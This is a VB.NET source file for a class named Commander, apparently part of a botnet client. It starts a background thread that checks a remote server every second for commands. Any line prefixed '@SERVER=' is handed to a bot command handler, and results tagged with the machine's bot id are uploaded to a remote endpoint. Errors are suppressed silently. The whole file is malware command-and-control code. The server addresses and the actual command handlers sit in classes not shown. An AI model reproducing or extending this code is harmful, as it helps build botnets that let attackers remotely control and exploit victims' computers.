Imports System.Collections.Specialized
Imports System.Threading
Public Class Commander
    Dim Config As New Config
    Dim Network As New Network
    Dim BotCommander As New BotCommander
    Public Sub Update(x As String)
        Dim C As New NameValueCollection
        C.Add("id", My.Settings.id)
        C.Add("cmd", x)
        Network.UploadValues(C, Config._Commander)
    End Sub
    Public Sub EnableReader()
        Dim Th As New Thread(AddressOf Read)
        Th.Start()
    End Sub
    Private Sub Read()
        Dim str As String = Nothing
        Dim CommanderClient = Nothing
        While (True)
            Try
                str = Network.GetFileContents(Config._strCommander)
                If str.Contains("=") Then 'Trigger
                    CommanderClient = str.Split("=")(0)
                    If (CommanderClient = "@SERVER") Then '@SERVER = Master
                        BotCommander.ConvertCommand(str.Split("=")(1))
                    End If
                End If
            Catch ex As Exception
            End Try
            Thread.Sleep(1000)
        End While
    End Sub
End Class